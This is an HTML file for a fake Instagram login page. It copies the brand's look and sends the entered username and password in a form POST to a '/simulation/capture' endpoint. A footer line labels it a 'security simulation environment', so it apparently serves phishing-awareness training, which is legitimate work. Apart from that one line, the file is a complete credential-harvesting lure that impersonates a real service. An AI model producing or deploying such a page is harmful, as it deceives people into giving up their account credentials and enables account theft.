<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>

    <style>
        body {
            font-family: Arial;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .box {
            background: white;
            border: 1px solid #ddd;
            padding: 40px;
            width: 350px;
            text-align: center;
        }

        .logo {
            font-size: 38px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        input {
            width: 90%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
        }

        button {
            width: 95%;
            padding: 10px;
            background: #3897f0;
            color: white;
            border: none;
            margin-top: 10px;
            cursor: pointer;
        }

        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: gray;
        }
    </style>
</head>

<body>

<div class="box">
    <div class="logo">Instagram</div>

    <form action="/simulation/capture" method="POST">
        <input type="text" name="username" placeholder="Phone, username or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    <div class="footer">
        This is a security simulation environment
    </div>
</div>

</body>
</html>
